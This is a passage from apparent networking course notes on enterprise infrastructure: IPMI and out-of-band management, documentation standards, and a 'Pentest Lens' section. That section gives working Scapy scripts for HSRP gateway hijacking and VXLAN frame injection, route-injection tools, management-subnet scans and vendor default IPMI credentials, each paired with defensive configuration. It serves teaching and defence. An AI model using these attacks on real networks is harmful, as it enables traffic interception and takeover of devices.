ipmitool -H 192.168.100.50 -U admin -P password power cycle
ipmitool -H 192.168.100.50 -U admin -P password power reset

# Virtual console (SOL — Serial Over LAN)
ipmitool -H 192.168.100.50 -U admin -P password -I lanplus sol activate
# Full console access over IP — works even if OS is unresponsive

# Sensor data
ipmitool -H 192.168.100.50 -U admin -P password sdr list    # Temperature, fan speed, voltages

# Event log
ipmitool -H 192.168.100.50 -U admin -P password sel list    # System event log
```

### OOB Management Network Design

```
┌─────────────────────────────────────────────┐
│        MANAGEMENT NETWORK (OOB)             │
│        192.168.100.0/24                     │
│                                             │
│  Management Switch (dedicated, isolated)    │
│         │                                   │
│    ┌────┴────────────────────┐              │
│    │                         │              │
│  Console                  IPMI/iDRAC        │
│  Server                   Interfaces        │
│    │                         │              │
│    └──────┬──────────────────┘              │
│    RS-232  SSH                              │
│    cables                                   │
└─────────────────────────────────────────────┘
         │
    Management Firewall (restricts access to OOB)
         │
    Jump Server (admin access only via VPN or dedicated circuit)
```

**Cisco IOS OOB management configuration**:
```cisco
! Dedicate management interface to OOB
interface GigabitEthernet0/0
 description "OOB Management"
 ip address 192.168.100.1 255.255.255.0
 no ip proxy-arp
 no ip redirects
 no ip unreachables

! VRF for management traffic (separates management routing from production)
ip vrf MGMT
 description "Out-of-band management VRF"

interface GigabitEthernet0/0
 ip vrf forwarding MGMT
 ip address 192.168.100.1 255.255.255.0

! Route management traffic through management VRF
ip route vrf MGMT 0.0.0.0 0.0.0.0 192.168.100.254

! Restrict SSH to management VRF only
line vty 0 15
 transport input ssh
 access-class MGMT-ACL in

ip access-list standard MGMT-ACL
 permit 192.168.100.0 0.0.0.255   ! Only from management network
 deny any log
```

---

## 9. Network Documentation Standards

### What to Document

Good network documentation means any engineer can understand and troubleshoot the network without prior knowledge. Poor documentation means single points of failure in people — and it fails during emergencies.

**Minimum required documentation**:
1. **Physical topology diagram**: Racks, physical cabling, patch panel ports
2. **Logical topology diagram**: VLANs, IP subnets, routing protocols, VPN tunnels
3. **IP address plan (IPAM)**: Every subnet, its purpose, gateway, VLAN, DHCP scope
4. **VLAN register**: VLAN ID, name, purpose, associated subnets
5. **Device inventory**: Hostname, IP, model, OS version, location, role
6. **Change management log**: Every change made to the network
7. **Runbooks**: Step-by-step procedures for common tasks (new VLAN, add switch, failover)

### IP Address Plan (IPAM)

```
Organisation: Corp Ltd
Address Space: 10.0.0.0/8

┌──────────────────────────────────────────────────────────────────┐
│ Subnet            │ VLAN │ Purpose        │ Gateway    │ DHCP    │
├──────────────────────────────────────────────────────────────────┤
│ 10.10.0.0/24      │  10  │ Staff PCs      │ 10.10.0.1  │ Yes     │
│ 10.10.1.0/24      │  20  │ Servers        │ 10.10.1.1  │ No(DHCP reservations only)│
│ 10.10.2.0/24      │  30  │ EPOS Tills     │ 10.10.2.1  │ Yes     │
│ 10.10.3.0/24      │  40  │ Wireless Users │ 10.10.3.1  │ Yes     │
│ 10.10.4.0/24      │  50  │ IP Phones      │ 10.10.4.1  │ Yes     │
│ 10.10.5.0/24      │  60  │ IP Cameras     │ 10.10.5.1  │ Yes     │
│ 10.10.100.0/24    │ 100  │ OOB Management │ 10.10.100.1│ No      │
│ 10.10.200.0/24    │ 200  │ DMZ            │ 10.10.200.1│ No      │
│ 10.255.0.0/24     │ N/A  │ Router P2P     │ N/A        │ No      │
└──────────────────────────────────────────────────────────────────┘
```

### VLAN Register

```
VLAN Register — Corp Ltd — Last Updated: 2026-04-05
┌──────────────────────────────────────────────────────────────────────┐
│ VLAN ID │ Name           │ Purpose                      │ Trunk Links │
├──────────────────────────────────────────────────────────────────────┤
│ 10      │ STAFF          │ Staff workstations           │ All trunks  │
│ 20      │ SERVERS        │ Application servers          │ DC trunks   │
│ 30      │ EPOS           │ EPOS tills — PCI scope       │ Store only  │
│ 40      │ WIRELESS       │ Corporate Wi-Fi users        │ All trunks  │
│ 50      │ VOICE          │ IP phones (QoS trust)        │ All trunks  │
│ 60      │ CAMERAS        │ IP CCTV (isolated)           │ Camera trunks│
│ 100     │ MANAGEMENT     │ Network device management    │ All trunks  │
│ 200     │ DMZ            │ Internet-facing servers      │ Firewall only│
│ 999     │ NATIVE-TRUNK   │ Unused native VLAN           │ All trunks  │
│ 1       │ DEFAULT        │ UNUSED — all ports unassigned│ None        │
└──────────────────────────────────────────────────────────────────────┘
```

### Change Management

Every network change should follow a process:
1. **Change Request**: What, why, risk assessment, rollback plan
2. **Approval**: Technical review + management sign-off (for significant changes)
3. **Maintenance Window**: Scheduled low-traffic period
4. **Pre-change backup**: `copy running-config startup-config`, export to TFTP/SFTP
5. **Implementation**: Execute change per plan
6. **Verification**: Test expected outcomes, check monitoring for alerts
7. **Documentation update**: Update topology diagrams, IP plan, VLAN register

```cisco
! Pre-change config backup
copy running-config tftp://192.168.100.10/backups/SW01-2026-04-05.cfg

! Post-change: verify and save
show running-config | checksum   ! Verify config
copy running-config startup-config
```

### Network Diagrams — Tools

**Free**: draw.io (diagrams.net), Lucidchart (freemium), Netbox (IPAM + documentation)
**Commercial**: Microsoft Visio, Omnigraffle
**Auto-discovery**: SolarWinds NPM, LibreNMS, Auvik

**Netbox** — open-source IPAM and DCIM:
```bash
# Deploy Netbox (Docker)
git clone https://github.com/netbox-community/netbox-docker
cd netbox-docker
docker-compose up -d

# Netbox tracks:
# Devices (hostname, model, serial, rack location)
# Interfaces (speed, connected-to)
# IP addresses (assigned to which interface)
# Prefixes and VLANs
# Circuits (ISP connections)
# Rack diagrams (U positions)
```

---

## 10. Pentest Lens — Enterprise Infrastructure

### Pentest Lens

**Attacker's view**: Enterprise infrastructure is built for high availability — which means redundancy, which means more attack surface. OSPF between distribution and core, HSRP on every VLAN, SNMP on every device, and a management network that, if reached, gives access to everything. The three-tier campus creates predictable topology that an attacker can map rapidly.

**Topology Discovery**:
```bash
# CDP/LLDP passive listening — reveals entire topology without scanning
tcpdump -i eth0 -e 'ether proto 0x88cc'    # LLDP
tcpdump -i eth0 -e 'ether proto 0x2000'    # CDP

# From Wireshark — CDP frames reveal:
# Device hostname, model, software version, IP address, port connected to
# Immediate topology map without any active scanning

# OSPF passive listening (if you're on a segment with OSPF)
# Filter: ospf in Wireshark
# Reveals: all OSPF router IDs, areas, neighbour relationships
# Router LSAs show all routers' link states → full topology

# Once on a device (post-compromise of switch/router):
show cdp neighbors detail          ! Full topology of all connected devices
show lldp neighbors detail
show ip ospf database              ! Full OSPF topology
show ip route                      ! All reachable networks
show vlan brief                    ! All VLANs (segmentation map)
show mac address-table             ! Where all hosts are (which port, which VLAN)
```

**HSRP/VRRP Attacks**:
```bash
# HSRP hijacking — become the active gateway
# Requires being on the same subnet as HSRP group

# Scapy — craft HSRP hello with higher priority
from scapy.all import *
from scapy.contrib.hsrp import *

# HSRP v1 coup packet (claim to be active with priority 255)
pkt = Ether(dst="01:00:5e:00:00:02") / \
      IP(src="192.168.1.99", dst="224.0.0.2") / \
      UDP(sport=1985, dport=1985) / \
      HSRP(state=16,    # Active state (Coup)
           priority=255, # Highest priority
           group=10,
           virtualIP="192.168.1.1",
           auth="cisco")     # Default auth string — often unchanged

send(pkt, iface="eth0", loop=1, inter=3)

# If successful: attacker becomes HSRP active gateway
# All LAN traffic now routes through attacker's machine
# Full MITM on the entire subnet

# Yersinia HSRP attack
yersinia hsrp -attack 1    # Become active router
```

**OSPF Route Injection**:
```bash
# If OSPF authentication disabled (common):
# Inject false routes → redirect traffic

# Scapy OSPF LSA injection (complex — use Loki tool)
# Loki — routing protocol attack tool
apt install loki
loki -i eth0    # Interactive OSPF/BGP attack framework
# Can inject Router LSAs, Summary LSAs, AS External LSAs
# → Attract traffic from entire OSPF domain
```

**VXLAN/VTEP Attacks**:
```bash
# If attacker can reach a VTEP on UDP 4789:
# Inject VXLAN-encapsulated frames into a tenant's VNI
# Can reach any host in that tenant's virtual network

# Craft VXLAN frame with Scapy
from scapy.all import *
from scapy.contrib.vxlan import VXLAN

inner_frame = Ether(src="AA:BB:CC:DD:EE:FF", dst="11:22:33:44:55:66") / \
              IP(src="10.100.1.99", dst="10.100.1.10") / \
              ICMP()

vxlan_pkt = IP(src="attacker-IP", dst="vtep-IP") / \
            UDP(dport=4789) / \
            VXLAN(vni=10100) / \       # Target tenant VNI
            inner_frame

send(vxlan_pkt)
# If VTEP doesn't authenticate VXLAN packets (many don't) → injection succeeds
```

**OOB Network as High-Value Target**:
```bash
# The management network is the crown jewel
# Access to 192.168.100.0/24 (OOB) → console access to EVERY device
# → Retype any config, reset any password, shut down any port

# How to reach OOB from internal compromise:
# Check routing tables for management subnet
ip route show | grep 192.168.100
# If routed (shouldn't be) → scan it
nmap -sn 192.168.100.0/24

# Identify console servers (typically respond on SSH port 22 + serial ports)
nmap -sV -p 22,23,4001,4002,8080 192.168.100.0/24

# IPMI/iDRAC (port 623 UDP for IPMI, 443 for web UI)
nmap -sU -p 623 192.168.100.0/24      # IPMI
nmap -p 443,80 192.168.100.0/24       # iDRAC/iLO web UI

# Default IPMI credentials (extremely common)
ipmitool -H 192.168.100.50 -U admin -P admin chassis status    # admin/admin
ipmitool -H 192.168.100.50 -U ADMIN -P ADMIN chassis status    # ADMIN/ADMIN (Supermicro)
ipmitool -H 192.168.100.50 -U Administrator -P calvin power status  # Dell iDRAC default
```

**MPLS/SD-WAN Recon**:
```bash
# Identify MPLS by TTL behaviour — MPLS decrements TTL
# traceroute to WAN shows MPLS hops (may show provider IPs or TTL without hostname)
traceroute 8.8.8.8

# SD-WAN orchestrator often web-accessible
# Look for management portals: /vmanage (Cisco), /orion (SolarWinds)
# Default credentials common on trial/misconfigured deployments

# If MPLS CE router accessible:
show mpls ldp bindings          ! Label distribution table
show mpls forwarding-table      ! LFIB (Label Forwarding Info Base)
show vrf                        ! VRFs configured = customers on shared MPLS
```

**Misconfigurations in Enterprise Infrastructure**:
```
HSRP/VRRP without authentication → gateway hijacking
HSRP/VRRP using default authentication strings ("cisco", "key") → trivially cracked
OSPF without authentication → route injection
STP without BPDU Guard on access ports → root bridge takeover
Management network routed from corporate network → OOB reachable if internal compromise
IPMI/iDRAC with default credentials → every server controllable
CDP/LLDP enabled on access ports → topology immediately visible to any connected device
VXLAN with no authentication on VTEP → cross-tenant frame injection
SD-WAN orchestrator with default or weak credentials → full WAN policy control
SNMP v2c community "public" on all devices → full read access everywhere
No change management → untracked changes, unreviewed backdoors
```

**Defender's counter**:
```cisco
! HSRP/VRRP: enforce MD5 authentication
standby 10 authentication md5 key-string StrongHSRPKey!
! OSPF: enforce MD5 authentication
ip ospf authentication message-digest
ip ospf message-digest-key 1 md5 OSPFSecret!
! CDP: disable on access/internet-facing ports
no cdp enable  (per interface)
! Management: strict OOB isolation (no routes between mgmt and production)
! IPMI: change default credentials, disable if not needed, restrict to OOB network
! SNMPv3 authPriv with strong credentials
! Jumbo frames on VXLAN underlay + authenticated VXLAN (EVPN provides this)
```

---

## Quick Reference — Module 10

### Three-Tier Layer Summary
| Layer | Devices | Key Functions | Protocols |
|-------|---------|--------------|-----------|
| Access | Workgroup switches | 802.1X, PoE, Port Security, VLANs | STP, LLDP |
| Distribution | L3 switches | Inter-VLAN routing, HSRP, ACL | OSPF, HSRP/VRRP |
| Core | High-speed switches | Fast routing, no policy | OSPF with BFD |

### FHRP Comparison
| Protocol | Active Gateways | Standard | Virtual MAC Prefix |
|----------|----------------|----------|--------------------|
| HSRP v2 | 1 | Cisco | 0000.0C9F.Fxxx |
| VRRP v3 | 1 | IEEE | 0000.5E00.01xx |
| GLBP | Up to 4 | Cisco | 0007.B400.xxyy |

### DSCP Key Values
| DSCP | Value | Use |
|------|-------|-----|
| EF | 46 | VoIP RTP — strict priority |
| CS5 | 40 | VoIP signalling |
| CS6 | 48 | Network control (OSPF, BGP) |
| AF41 | 34 | Video conferencing |
| AF31 | 26 | Critical business apps |
| Default | 0 | Best-effort internet |
| CS1 | 8 | Scavenger (P2P, backups) |

### Key Verification Commands
```cisco
show standby brief              ! HSRP status
show vrrp brief                 ! VRRP status
show glbp brief                 ! GLBP status
show ip ospf neighbor           ! OSPF adjacencies
show policy-map interface       ! QoS statistics
show nve vni                    ! VXLAN VNI table
show bgp l2vpn evpn             ! EVPN BGP table
show mpls forwarding-table      ! MPLS label table
show ip route vrf <name>        ! VRF routing table
```

### VXLAN Header Fields
| Field | Size | Value |
|-------|------|-------|
| Outer UDP dst port | 16 bits | 4789 |
| VXLAN flags | 8 bits | 0x08 (I bit = VNI valid) |
| VNI | 24 bits | 0–16,777,215 |

---

## Related Notes
- [[Module-02-Devices-Infrastructure]] — STP, VLANs, OSPF at device level
- [[Module-04-Network-Security]] — Security zones implemented at distribution/core
- [[Module-05-Firewall-Configuration]] — Firewall between distribution zones
- [[Module-06-Network-Monitoring]] — NetFlow, SNMP monitoring of enterprise devices
- [[Module-09-VPNs-Remote-Access]] — SD-WAN and MPLS as WAN transport
- [[Module-12-Pentest-Perspective]] — Enterprise attack chains using topology knowledge
